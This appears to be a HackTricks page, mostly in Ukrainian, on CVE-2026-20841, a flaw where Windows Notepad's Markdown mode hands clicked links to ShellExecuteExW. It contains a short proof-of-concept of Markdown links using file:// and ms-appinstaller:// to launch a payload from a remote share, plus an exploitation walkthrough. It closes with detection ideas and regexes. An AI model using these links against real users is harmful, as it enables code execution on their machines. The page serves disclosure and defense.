# Обробник протоколів Windows / зловживання ShellExecute (Markdown Renderers)

{{#include ../banners/hacktricks-training.md}}

Сучасні програми Windows, які рендерять Markdown/HTML, часто перетворюють посилання, надані користувачем, на клікабельні елементи і передають їх у `ShellExecuteExW`. За відсутності суворого переліку дозволених схем будь-який зареєстрований обробник протоколу (наприклад, `file:`, `ms-appinstaller:`) може бути викликаний, що призведе до виконання коду в контексті поточного користувача.

## ShellExecuteExW surface in Windows Notepad Markdown mode
- Notepad chooses Markdown mode **only for `.md` extensions** via a fixed string comparison in `sub_1400ED5D0()`.
- Підтримувані Markdown-посилання:
- Стандартне: `[text](target)`
- Autolink: `<target>` (рендериться як `[target](target)`), тож обидва синтакси важливі для payload-ів і детекцій.
- Кліки по посиланнях обробляються в `sub_140170F60()`, яка виконує слабке фільтрування і потім викликає `ShellExecuteExW`.
- `ShellExecuteExW` делегує обробку **будь-якому налаштованому обробнику протоколу**, а не лише HTTP(S).

### Розгляд payload-ів
- Будь-які послідовності `\\` у посиланні **нормалізуються в `\`** перед викликом `ShellExecuteExW`, що впливає на формування UNC/шляхів і детекцію.
- `.md` файли **за замовчуванням не асоційовані з Notepad**; жертва все ще повинна відкрити файл у Notepad і клікнути по посиланню, але після рендерингу посилання стає клікабельним.
- Приклади небезпечних схем:
- `file://` для запуску локального/UNC payload-а.
- `ms-appinstaller://` для запуску потоків App Installer. Інші локально зареєстровані схеми також можуть бути вразливими.

### Minimal PoC Markdown
```markdown
[run](file://\\192.0.2.10\\share\\evil.exe)
<ms-appinstaller://\\192.0.2.10\\share\\pkg.appinstaller>
```
### Потік експлуатації
1. Створіть **`.md` файл**, щоб Notepad відображав його як Markdown.
2. Вставте посилання, яке використовує небезпечну URI-схему (`file:`, `ms-appinstaller:` або будь-який інший встановлений handler).
3. Доставте файл (HTTP/HTTPS/FTP/IMAP/NFS/POP3/SMTP/SMB або подібним шляхом) і переконайте користувача відкрити його в Notepad.
4. При натисканні **нормалізоване посилання** передається в `ShellExecuteExW`, і відповідний обробник протоколу виконує вказаний контент у контексті користувача.

## Ідеї для виявлення
- Стежте за передачею `.md` файлів через порти/протоколи, які зазвичай доставляють документи: `20/21 (FTP)`, `80 (HTTP)`, `443 (HTTPS)`, `110 (POP3)`, `143 (IMAP)`, `25/587 (SMTP)`, `139/445 (SMB/CIFS)`, `2049 (NFS)`, `111 (portmap)`.
- Аналізуйте Markdown-посилання (стандартні та autolink) і шукайте **без урахування регістру** `file:` або `ms-appinstaller:`.
- Регулярні вирази, рекомендовані вендором, для виявлення доступу до віддалених ресурсів:
```
(\x3C|\[[^\x5d]+\]\()file:(\x2f|\x5c\x5c){4}
(\x3C|\[[^\x5d]+\]\()ms-appinstaller:(\x2f|\x5c\x5c){2}
```
- Звітовано, що поведінка патчу **allowlists local files and HTTP(S)**; усе інше, що потрапляє до `ShellExecuteExW`, є підозрілим. Розширте виявлення на інші встановлені обробники протоколів за потреби, оскільки attack surface варіюється залежно від системи.

## Посилання
- [CVE-2026-20841: Arbitrary Code Execution in the Windows Notepad](https://www.thezdi.com/blog/2026/2/19/cve-2026-20841-arbitrary-code-execution-in-the-windows-notepad)
- [CVE-2026-20841 PoC](https://github.com/BTtea/CVE-2026-20841-PoC)

{{#include ../banners/hacktricks-training.md}}
